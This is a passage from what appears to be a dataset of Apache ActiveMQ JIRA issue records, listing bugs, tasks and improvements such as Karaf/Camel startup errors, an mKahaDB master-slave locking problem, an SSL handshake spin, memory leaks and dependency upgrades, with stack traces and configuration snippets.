The ant build.xml file of activemq reports that "durable option" will create a durable subscriber     [echo]             ant producer <options> - Creates a producer publishing a number of messages     [echo]     [echo]             Producer Options:     [echo]                             url - Used to specify acustom URL for the broker,     [echo]                                   e.g., tcp://hostname:1234     [echo]                           topic - A boolean to determine whether to use topics     [echo]                           or queues     [echo]                         subject - Used to specify a custom destination name,     [echo]                                   e.g. MyDestination     [echo]                         durable - A boolean to specify that you want to create     [echo]                                   a durable topic subscriber?Obviously, this is a mistake as the "durable" option for the producer allows to change DeliveryMode of the message ("PERSISTENT" or "NON-PERSISTENT")Maybe, we should use "persistent" as property name but then the build.xml file and java class need to be changed
issueID:AMQ-4727
type:Bug
changed files:
texts:Unable to add camel routes to activemq running in a karaf container
gtully: noconnor: there is a pax exam test on apache trunk that validates the karaf features - see the xml https://github.com/apache/activemq/blob/trunk/activemq-karaf-itest/src/test/resources/org/apache/activemq/karaf/itest/activemq-nd-camel.xml&#91;07:35am&#93; gtully: in 6.0 u can try the same - just embed a context&#91;07:36am&#93; gtully: so modify etc/activemq.xml&#91;07:36am&#93; noconnor: gtully: thanks, trying it now&#91;07:44am&#93; noconnor: gtully: same issue again, "bundle context must be specified"&#91;07:49am&#93; gtully: noconnor: i see the same thing with the test on trunk… need to investigate that a bit…can u raise an amq issue&#91;07:51am&#93; gtully: noconnor: on trunk that can be reproduced with mvn test -Dtest=ActiveMQBrokerNdCamelFeatureTest in the activemq-karaf-itest moduleException on start: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "activemq" defined in file [/opt/jboss-amq/jboss-a-mq-6.0.0.redhat-024/etc/activemq.xml]: Initialization of bean failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name "camel": Invocationof init method failed; nested exception is java.lang.IllegalArgumentException: BundleContext must be specifiedorg.springframework.beans.factory.BeanCreationException: Error creating bean with name "activemq" defined in file &#91;/opt/jboss-amq/jboss-a-mq-6.0.0.redhat-024/etc/activemq.xml&#93;: Initialization of bean failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name "camel": Invocation of init method failed; nested exception is java.lang.IllegalArgumentException: BundleContext must be specifiedAlso I had to add the activemq-camel feature to org.apache.karaf.features.cfg to get the namespaces resolved
issueID:AMQ-4729
type:Bug
changed files:
texts:mKahaDB master slave needs lock when filtered adapter locks are created on the fly
<mKahaDB directory="../kahadb">   <filteredPersistenceAdapters>      <!-- kahaDB per destinations -->      <filteredKahaDB perDestination="true" >        <persistenceAdapter>          <kahaDB journalMaxFileLength="32mb" />        </persistenceAdapter>      </filteredKahaDB>    </filteredPersistenceAdapters>problem:1. Starting the slave with an "empty" database, i.e no queues results in the slave trying to start and ultimately failing as the address is in use. There"s now lock. Pushing a message to TEST.FOO and then starting the database works OK. The slave comes up and locks and waits.2. Now, adding a TEST.FOO1 to the master. The master now has the two queues, TEST.FOO and TEST.FOO1. Kill the master and let the slave take over. The slave only sees TEST.FOO. Not TEST.FOO1.
issueID:AMQ-4731
type:Bug
changed files:AdvisoryBroker.java
texts:TempQueueMemoryTest started failing recently.
TempQueueMemoryTest test is failing.  Fails after changes made for AMQ-2327 because of the way the ConcurrentSkipListMap does its sorting and searching and the implementation of ConsumerIdKey.  The key comparison depends on creation time but later removals will always have a later creation time which causes the search for the element to fails most of the time since it will compare greater than even to a key with the same consumer Id.  Result is that items are left in the consumers map causing a memory leak.
issueID:AMQ-4732
type:Task
changed files:
texts:maven : add IssueManagement declaration
It would be nice to get the IssueManagement declared in pom.xml like this : <issueManagement> <system>Jira</system> <url>https://issues.apache.org/jira/browse/AMQ</url> </issueManagement>
issueID:AMQ-4733
type:Task
changed files:
texts:Upgrade to Jasypt 1.9.1
None
issueID:AMQ-4734
type:Task
changed files:
texts:Upgrade Jolokia to 1.1.3
ActiveMQ currently uses Jolokia 1.0.6 while the latest version is 1.1.3.It would be good to upgraded Jolokia before the 5.9.0 release.
issueID:AMQ-4740
type:Bug
changed files:StompSocket.java
texts:heart-beat is disabled when connecting to web socket
If I use the stomp.js library to connect to ActiveMQ over its WebSocket url (ws://localhost:61614), the CONNECTED frame returns with disabled heart-beat:CONNECTEDheart-beat:0,0session:ID:retsina.local-63633-1380117269290-2:1server:ActiveMQ/5.8.0version:1.1If I connect to its TCP socket (localhost:61613), the CONNECT frame will have heart-beat:CONNECTEDheart-beat:10000,10000session:ID:retsina.local-63384-1380115729700-2:12server:ActiveMQ/5.8.0version:1.1In both case, the stomp.js send the same CONNECT frame with heart-beat:CONNECTlogin:userpasscode:passwordaccept-version:1.1,1.0heart-beat:10000,10000Is heart-beat disabled on purpose for Web Socket? Please note that the stomp.js does support heart-beat (using window.setInterval in a Web browser)
issueID:AMQ-4741
type:Bug
changed files:
texts:Qpid producer.send with sync_publish=true set against activemq blocks and doesn&#39;t return
While producer.send with system property sync_publish=true against activemq block failing to return, the same scenario works fine against Microsoft Azure Service Bus.This interferes with testing isolated local systems without remote MS ASB integration.This was not tested against either of the Qpid brokers or the Active MQ 5.9.0 codebase.See Qpid bug https://issues.apache.org/jira/browse/QPID-5177 for more information.Gordon Sim commented:ActiveMQ does send back a disposition with settled=true, but with no state set (e.g. not accepted) which may be the issue?
issueID:AMQ-4744
type:Bug
changed files:
texts:Support using LevelDB as a nested store in mKahaDB
None
issueID:AMQ-4745
type:Task
changed files:
texts:Upgrade to json-simple 1.1.1
None
issueID:AMQ-4746
type:Bug
changed files:ClassLoadingAwareObjectInputStream.java
texts:Applet ClassLoader Problems
Applets fail to deserailize messages in a timely manner after a network failure triggers a reconnect using the FailoverTransportIn ClassLoadingAwareObjectInputStream.java the  load() method makes a call to Class.forName().For the primitive types (int, boolean, etc.) this would result in a call similar to:    Class.forName("int", false, loader); //Where loader is the Applet2ClassLoaderSince Applet2ClassLoader is a URLClassLoader and "int.class" is not in the jar cache it pulled down from the server at the start of application, it is going to try and go to the server to resolve this class.In the event of a network failure, this will result in the ClassLoader having to wait for the socket timeout. (see stacktrace at link) Once this socket timeout occurs, the load() method then attempts to lookup the class in the primitive HashMap that is statically initialized. This returns the class for the int and the deserialization continues on.At first it seemed like the messages were failing to be received but it turned out they were just taking a very long time to be deserialized. This problem can be avoided by changing the order in which ClassLoadingAwareObjectInputStream tries to resolve the class. Here is the change I made to the load() method: http://activemq.2283324.n4.nabble.com/Applet-Class-Loader-Problems-td4671835.html
issueID:AMQ-4747
type:Bug
changed files:
texts:WARN in hawt.io console
When starting the hawt.io console, we see several WARN messages like this:Ignored: java.io.FileNotFoundException: /home/jbonofre/workspace/activemq/activemq/assembly/target/apache-activemq-5.9-SNAPSHOT/webapps/hawtio/WEB-INF/classes (Is a directory)
issueID:AMQ-4748
type:Bug
changed files:StartCommand.java
texts:Default configuration raises an exception at shutdown
When using the default configuration, starting with bin/activemq console, at broker shutdown (using CTRL-C), an exception (ERROR) is displayed:ERROR: java.lang.IllegalStateException: Shutdown in progressjava.lang.IllegalStateException: Shutdown in progress        at java.lang.ApplicationShutdownHooks.remove(ApplicationShutdownHooks.java:82)        at java.lang.Runtime.removeShutdownHook(Runtime.java:237)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:119)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)        at java.lang.reflect.Method.invoke(Method.java:601)        at org.apache.activemq.console.Main.runTaskClass(Main.java:262)        at org.apache.activemq.console.Main.main(Main.java:115)
issueID:AMQ-4749
type:Task
changed files:
texts:Upgrade to xerces 2.11.0
None
issueID:AMQ-4750
type:Task
changed files:
texts:WebConsole readme in assembly should be updated with hawtio details
We need to add details to this file to refer to hawtio as the web console, and have the old web console in a WebConsoleOld file until the console is removed in a future release.
issueID:AMQ-4751
type:Task
changed files:
texts:Upgrade to commons-io 2.4
None
issueID:AMQ-4752
type:Task
changed files:
texts:Upgrade to derby 10.10.1.1
None
issueID:AMQ-4753
type:Bug
changed files:
texts:amqp+nio+ssl: infinite loop during inital handshake with SSL + client certs
Start with a client application running qpid v0.24 connecting to activemq v5.8.0 server over amqps. Configure the activemq server to use client SSL certificates for authentication.                <!-- aqmp with SSL client certs -->         <transportConnector name="amqps" uri="amqp+ssl://0.0.0.0:5672?maximumConnections=1000&amp;wireformat.maxFrameSize=104857600&amp;transport.transformer=jms&amp;needClientAuth=true"/>This works and messages successfully flow from server to client. Qpid however has a fatal bug where it cannot recover from broken connections, and so attempt to switch to the activemq amqp client to work around this problem.On the client, we initialise activemq-amqp with the following parameters:<!-- activemq -->  <Parameter name="java.naming.factory.initial" value="org.apache.activemq.jndi.ActiveMQInitialContextFactory" />  <Parameter name="connectionFactoryNames" value="ConnectionFactory, QueueConnectionFactory, TopicConnectionFactory" />  <!-- Server to connect to --><!-- activemq -->  <Parameter name="java.naming.provider.url" value="amqp+nio+ssl://amqp.${env:SERVER_ENV}.example.com:5672" />With activemq-amqp in place instead of qpid, the client starts up, but no messages are processed. Instead, it is found that the aqmp+nio+ssl provider is spinning the CPU at 100% part of the way through the SSL handshake process.A thread dump of the spinning thread is as follows:Full thread dump Java HotSpot(TM) 64-Bit Server VM (23.25-b01 mixed mode):"localhost-startStop-1" daemon prio=10 tid=0x000000000179b800 nid=0x638e runnable [0x00007fd1fd84a000]   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.FileDispatcherImpl.read0(Native Method)        at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:39)        at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:225)        at sun.nio.ch.IOUtil.read(IOUtil.java:198)        at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:375)        - locked <0x00000000c4da50e8> (a java.lang.Object)        at org.apache.activemq.transport.nio.NIOSSLTransport.secureRead(NIOSSLTransport.java:285)        at org.apache.activemq.transport.nio.NIOSSLTransport.doHandshake(NIOSSLTransport.java:333)        at org.apache.activemq.transport.nio.NIOSSLTransport.initializeStreams(NIOSSLTransport.java:128)        at org.apache.activemq.transport.amqp.AmqpNioSslTransport.initializeStreams(AmqpNioSslTransport.java:43)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:514)        at org.apache.activemq.transport.nio.NIOTransport.doStart(NIOTransport.java:156)        at org.apache.activemq.transport.nio.NIOSSLTransport.doStart(NIOSSLTransport.java:356)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:238)        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:184)...If an attempt is made to restart the activemq server, despite the spinning thread on the client the server side disconnection is detected by the client and the following exception is logged and the connection is successfully aborted:Caused by: java.io.IOException: javax.net.ssl.SSLException: Received close_notify during handshake        at org.apache.activemq.transport.nio.NIOSSLTransport.initializeStreams(NIOSSLTransport.java:130)        at org.apache.activemq.transport.amqp.AmqpNioSslTransport.initializeStreams(AmqpNioSslTransport.java:43)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:514)        at org.apache.activemq.transport.nio.NIOTransport.doStart(NIOTransport.java:156)        at org.apache.activemq.transport.nio.NIOSSLTransport.doStart(NIOSSLTransport.java:356)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)        ... 33 moreCaused by: javax.net.ssl.SSLException: Received close_notify during handshake        at sun.security.ssl.Alerts.getSSLException(Alerts.java:208)        at sun.security.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1619)        at sun.security.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1587)        at sun.security.ssl.SSLEngineImpl.recvAlert(SSLEngineImpl.java:1732)        at sun.security.ssl.SSLEngineImpl.readRecord(SSLEngineImpl.java:1060)        at sun.security.ssl.SSLEngineImpl.readNetRecord(SSLEngineImpl.java:884)        at sun.security.ssl.SSLEngineImpl.unwrap(SSLEngineImpl.java:758)        at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:624)        at org.apache.activemq.transport.nio.NIOSSLTransport.secureRead(NIOSSLTransport.java:304)        at org.apache.activemq.transport.nio.NIOSSLTransport.doHandshake(NIOSSLTransport.java:333)        at org.apache.activemq.transport.nio.NIOSSLTransport.initializeStreams(NIOSSLTransport.java:128)        ... 42 moreWhat seems to be happening is that amqp+nio+ssl gets part of the way through the handshake fails and goes into a spin, continuing the spin until the TCP connection is killed from the other side, at which point the client aborts and continues as if nothing had happened.
issueID:AMQ-4754
type:Improvement
changed files:
texts:Add connection counters at broker level
Apollo has aggregated connection counters at broker level: "connected" for the number of existing connections and "connection_counter" for the total number of connections since reset, allowing to derive from it a connection rate.It would be very useful to expose similar counters for ActiveMQ to improve what can be monitored.
issueID:AMQ-4757
type:New Feature
changed files:
texts:Provide a generic jms XA connection pool
When the jms bridge or camel is used with a third party jms provider the need for connection pooling and XA enlistment remains. The existing activemq-pool has hard dependencies on activemq so it cannot be used.the idea is to extract the AMQ deps and make activemq-jms-pool a dependent of activemq-pool so we can leverage the shared pool impl on both ends of a jms bridge or in camel.
issueID:AMQ-4758
type:Improvement
changed files:
texts:Improve performance of pull consumers
When we have a queue with only pull consumers (prefetch 0), there are a lot of necessary work being done trying to dispatch every paged message to every consumer. The problem is that most of consumers are full all the time and we lose a lot of cpu time trying to traverse all messages. The problem is more apparent with large number of paged messages.
issueID:AMQ-4760
type:New Feature
changed files:activemq-karaf.xml
DstatCommand.java
texts:Add dstat command to activemq karaf commands
We have a new dstat command that can display queue information in tabular format. We need to add that to activemq karaf commands.Also we should polish how the display of the tabular data is displayed as long queue names may cause the output to look not as good.
issueID:AMQ-4766
type:New Feature
changed files:PolicyEntry.java
CachedMessageGroupMap.java
bucket
MessageGroupHashBucket.java
SimpleMessageGroupMap.java
QueueViewMBean.java
Queue.java
QueueView.java
GroupFactoryFinder.java
cached
CachedMessageGroupMapFactory.java
SimpleMessageGroupSet.java
simple
MessageGroupMap.java
texts:Expose Message Group maps via JMX
It would be really handy to have the Message Group maps exposed via JMX and to allow admins to purge, and delete unused ones w/o having to rely on the MsgSeqId="-1" message to come through.
issueID:AMQ-4769
type:Bug
changed files:
texts:Connection.close() throws exception if already closed.
The Javadoc for Connection.close() readsClosing a closed connection must NOT throw an exception.Yet, I get this:Exception in thread "TrueUpdate Manager JMS / Receiver" java.lang.IllegalStateException: org.apache.activemq.ConnectionClosedException: The connection is already closed at net.java.trueupdate.jms.JmsReceiver.run(JmsReceiver.java:105) at java.lang.Thread.run(Thread.java:680)Caused by: org.apache.activemq.ConnectionClosedException: The connection is already closed at org.apache.activemq.ActiveMQConnection.checkClosed(ActiveMQConnection.java:1477) at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1464) at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:566) at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:630) at net.java.trueupdate.jms.JmsReceiver.run(JmsReceiver.java:97) ... 1 more
issueID:AMQ-4780
type:Task
changed files:
texts:Upgrade to qpid 0.24
We should upgrade to recent 0.24 release which Camel also uses.
issueID:AMQ-4784
type:Task
changed files:
texts:Upgrade Jolokia to 1.1.4
Jolokia 1.1.4 has just been released. This version fixes a problem when accessing a busy ActiveMQ server (https://github.com/rhuss/jolokia/issues/117).Please upgrade ActiveMQ to use this version.
issueID:AMQ-4785
type:Bug
changed files:
texts:Failover maxReconnectAttempts=0 incorrectly calls org.apache.activemq.transport.TransportListener#transportInterupted
When failover is not reconnecting, maxReconnectAttempts=0, so it just being used to pick a url, on disconnect it should not invoke the interrupted/resumed transportExceptionhandler callback b/c there is no possibility of a resume. The exception just bubbles up to the application.
issueID:AMQ-4787
type:Improvement
changed files:
texts:ActiveMQ web console welcome page should not be constrained
When accessing the welcome page on the web consolehttp://localhost:8161There is just a index.html file and some css and images. We should let this page be non contrained / non secure. So people can see this page asap.But the web consoles (admin) and (hawtio) can still be secured out of the box.We also need some details in WebConsole-Readme.txt file in the distribution to mention about the secured consoles. And how you can setup user accounts out of the box. eg to edit the conf/jetty-realm.properties file.
issueID:AMQ-4788
type:Bug
changed files:
texts:Add support for allowing the broker to partition client client load across a broker cluster using a partitioning config
None
issueID:AMQ-4791
type:Bug
changed files:
texts:[org.apache.activemq.ActiveMQConnection] dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete..
Race condition between consumer close and transport calculation of outstanding interruption processing. Transport thinks there are more responses required before allowing dispatch due to a mis count of active consumers.NOTE: This is issue was initially reported using the Spring DMLC with the AMQ rar deployed in a J2EE container. However it can be replicated the issue with a simple JMS client creating a new consumer and closing the consumer for every call to consumer.receive(1000).The client AMQ connection appears to stop dispatching messages to the consumer and continuously logs the following messageWARN  &#91;org.apache.activemq.ActiveMQConnection&#93; (ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@51487) dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete..Thread appears to remain in following state - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(java.lang.Object, long) @bci=20, line=226 (Compiled frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(int, long) @bci=122, line=1033 (Interpreted frame) - java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(int, long) @bci=25, line=1326 (Compiled frame) - java.util.concurrent.CountDownLatch.await(long, java.util.concurrent.TimeUnit) @bci=10, line=282 (Compiled frame) - org.apache.activemq.ActiveMQConnection.waitForTransportInterruptionProcessingToComplete() @bci=82, line=2455 (Compiled frame) - org.apache.activemq.ActiveMQConnection$3.processMessageDispatch(org.apache.activemq.command.MessageDispatch) @bci=4, line=1841 (Compiled frame) - org.apache.activemq.command.MessageDispatch.visit(org.apache.activemq.state.CommandVisitor) @bci=2, line=113 (Compiled frame) - org.apache.activemq.ActiveMQConnection.onCommand(java.lang.Object) @bci=29, line=1838 (Compiled frame) - org.apache.activemq.transport.ResponseCorrelator.onCommand(java.lang.Object) @bci=172, line=116 (Compiled frame) - org.apache.activemq.transport.MutexTransport.onCommand(java.lang.Object) @bci=52, line=50 (Compiled frame) - org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(java.lang.Object) @bci=148, line=203 (Compiled frame) - org.apache.activemq.transport.WireFormatNegotiator.onCommand(java.lang.Object) @bci=29, line=113 (Compiled frame) - org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(java.lang.Object) @bci=156, line=288 (Compiled frame) - org.apache.activemq.transport.TransportSupport.doConsume(java.lang.Object) @bci=16, line=83 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.doRun() @bci=7, line=214 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.run() @bci=47, line=196 (Compiled frame) - java.lang.Thread.run() @bci=11, line=722 (Interpreted frame)
issueID:AMQ-4795
type:Improvement
changed files:
texts:Enable amqp transport out of the box in activemq-karaf
We should add amqp transport out of the box in karaf so its similar to the standalone broker.
issueID:AMQ-4798
type:Bug
changed files:
texts:Destination limit for advisory topic very high after recent commit
&#91;10:58:42&#93; <davsclaus>  gtully on last amq from ASF i see this when starting the standalone broker&#91;10:58:43&#93; <davsclaus>  INFO | Usage(default:memory:topic://ActiveMQ.Advisory.MasterBroker:memory) limit=720332416 should be smaller than its parent limit=720332390&#91;10:58:54&#93; <davsclaus>  i guess its the recent 70% heap memory stuff&#91;10:59:11&#93; <davsclaus>  just wonder if everyone will see this, and if we can make the message more friendly?&#91;11:28:06&#93; <rajdavies>  davsclaus - why is the destination memory limit so high for an advisory ?&#91;11:29:23&#93; <davsclaus>  rajdavies not sure - gtully changed the default settings yesterday instead of fixed 64mb limit etc&#91;11:29:31&#93; <davsclaus>  it was 70% heap memory based instead&#91;11:30:03&#93; <dejanb>  rajdavies: and per destination limit is removed … so I guess we have some bug in there&#91;11:30:06&#93; <davsclaus>  http://git-wip-us.apache.org/repos/asf/activemq/commit/5bdcc196&#91;11:30:39&#93; <rajdavies>  davsclaus - ok - looks like a bug then
issueID:AMQ-4799
type:Improvement
changed files:WSTransportServer.java
texts:Starting AMQ standalone - ws connector url/port not logged
HiWhen starting the broker in standalone mode, we have a number oftransports out of the box.As you can see for openwire, stomp, and mqtt, we also log listeningfor connections at ....But for WS we do not do that. It would probably be nice if we could dothat as well, so people can see the urls / ports in use.is there a reason why ws doesn"t do that? INFO | Listening for connections at:tcp://davsclaus.air:61616?maximumConnections=1000&wireFormat.maxFrameSize=104857600 INFO | Connector openwire started INFO | Listening for connections at:amqp://davsclaus.air:5672?maximumConnections=1000&wireFormat.maxFrameSize=104857600 INFO | Connector amqp started INFO | Listening for connections at:stomp://davsclaus.air:61613?maximumConnections=1000&wireFormat.maxFrameSize=104857600 INFO | Connector stomp started INFO | Listening for connections at:mqtt://davsclaus.air:1883?maximumConnections=1000&wireFormat.maxFrameSize=104857600 INFO | Connector mqtt started INFO | Connector ws started
issueID:AMQ-4801
type:Improvement
changed files:AjaxListener.java
texts:ActiveMQ web demo - chat example - Logs jetty IDLE ERROR 1st time
When running the chat example in the web demos, then the first time you login you get this error in the console WARN | Broker localhost not started so using amq-broker instead WARN | Broker localhost not started so using amq-broker insteadERROR | Error receiving message java.lang.IllegalStateException: IDLE,initialjava.lang.IllegalStateException: IDLE,initial at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:408) at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:815) at org.apache.activemq.web.AjaxListener.onMessageAvailable(AjaxListener.java:72) at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1383) at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131) at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:724)The web demos can be started withbin/activemq console xbean:examples/conf/activemq-demo.xml
issueID:AMQ-4803
type:Task
changed files:
texts:Examples - Update instructions due recent moving of files to new directory
./activemq-demo.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-demo.xml to your command./activemq-demo.xml:    e.g. $ bin/activemq console xbean:conf/activemq-demo.xml./activemq-dynamic-network-broker1.xml:    $ bin/activemq console xbean:conf/activemq-dynamic-network-broker1.xml./activemq-dynamic-network-broker1.xml:    $ bin/activemq console xbean:conf/activemq-dynamic-network-broker2.xml./activemq-dynamic-network-broker2.xml:    $ bin/activemq console xbean:conf/activemq-dynamic-network-broker1.xml./activemq-dynamic-network-broker2.xml:    $ bin/activemq console xbean:conf/activemq-dynamic-network-broker2.xml./activemq-jdbc-performance.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-jdbc.xml to your command./activemq-jdbc-performance.xml:    e.g. $ bin/activemq console xbean:conf/activemq-jdbc.xml./activemq-jdbc.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-jdbc.xml to your command./activemq-jdbc.xml:    e.g. $ bin/activemq console xbean:conf/activemq-jdbc.xml./activemq-scalability.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-scalability.xml to your command./activemq-scalability.xml:    e.g. $ bin/activemq console xbean:conf/activemq-scalability.xml./activemq-security.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-security.xml to your command./activemq-security.xml:    e.g. $ bin/activemq console xbean:conf/activemq-security.xml./activemq-static-network-broker1.xml:    $ bin/activemq console xbean:conf/activemq-static-network-broker1.xml./activemq-static-network-broker1.xml:    $ bin/activemq console xbean:conf/activemq-static-network-broker2.xml./activemq-static-network-broker2.xml:    $ bin/activemq console xbean:conf/activemq-static-network-broker1.xml./activemq-static-network-broker2.xml:    $ bin/activemq console xbean:conf/activemq-static-network-broker2.xml./activemq-stomp.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-stomp.xml to your command./activemq-stomp.xml:    e.g. $ bin/activemq console xbean:conf/activemq-stomp.xml./activemq-throughput.xml:    To run ActiveMQ with this configuration add xbean:conf/activemq-throughput.xml to your command./activemq-throughput.xml:    e.g. $ bin/activemq console xbean:conf/activemq-throughput.xml
issueID:AMQ-4806
type:Improvement
changed files:
texts:&#39;./bin/activemq console&#39; should &#39;exec&#39; java so that way scripts calling it can get the pid for the broker&#39;s java process.
None
issueID:AMQ-4813
type:Bug
changed files:
texts:webconsole - Viewing message details when message ID contains a plus results in " No message could be found for ID {messageID}"
Steps to reproduce: Using the admin console, go to the Queues page. Click on one of the queues to get to the queue"s browse page. Click on a message ID that contains a plus sign .Expected:See the message"s headers, properties, actions, and details.Actual:Get a page with the error message "No message could be found for ID {messageID}", where {messageID} contains the message ID clicked on.  Note that the message ID displayed in the error message replaces the plus sign  with a space.Underlying cause:The html link that is created for each message ID in the queue"s browse page does not properly URL encode the message ID.  In my particular example, the link for message ID "AgXkceW74zCq+kZB1llPos1QcmTfOziGAmWRuk1forI=" is:    http://localhost:8161/admin/message.jsp?id=AgXkceW74zCq+kZB1llPos1QcmTfOziGAmWRuk1forI=&JMSDestination=AMQPTestwhen it should be:    http://localhost:8161/admin/message.jsp?id=AgXkceW74zCq%2BkZB1llPos1QcmTfOziGAmWRuk1forI=&JMSDestination=AMQPTestThe trouble area is shown with a red font.
issueID:AMQ-4814
type:Bug
changed files:
texts:Memory leak when unsubscribing durable consumer
When creating and closing durable subscribers, references to FilePendingMessageCursor in MemoryUsage.listeners are not cleaned up.The reason seems to be a missing call to FilePendingMessageCursor.destroy() in StoreDurableSubscriberCursor.stop().A simple demo to reproduce the issue is attached (the leak is clearly visible after a few hundred to thousand runs). Also, i have attached a patch which resolves this issue for me - could someone check if this is correct?
issueID:AMQ-4816
type:Task
changed files:
texts:Update deprecated code in activemq-camel tests
I get the following warnings when running the apache-camel tests&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/CamelJmsTest.java:&#91;31,35&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/CamelJmsTest.java:&#91;40,34&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/TransactedConsumeTest.java:&#91;35,35&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/TransactedConsumeTest.java:&#91;42,43&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/CamelDestinationExclusiveConsumerTest.java:&#91;25,47&#93; &#91;deprecation&#93; AbstractJUnit38SpringContextTests in org.springframework.test.context.junit38 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/CamelDestinationExclusiveConsumerTest.java:&#91;31,59&#93; &#91;deprecation&#93; AbstractJUnit38SpringContextTests in org.springframework.test.context.junit38 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/DlqTest.java:&#91;28,35&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/DlqTest.java:&#91;35,29&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/JmsJdbcXALoadTest.java:&#91;23,35&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/JmsJdbcXALoadTest.java:&#91;40,39&#93; &#91;deprecation&#93; CamelSpringTestSupport in org.apache.camel.test.junit4 has been deprecated&#91;WARNING&#93; /Users/kearls/sources/activemq/activemq-camel/src/test/java/org/apache/activemq/camel/SetHeaderTest.java:&#91;30,47&#93; &#91;deprecation&#93; AbstractJUnit38SpringContextTests in org.springframework.test.context.junit38 has been 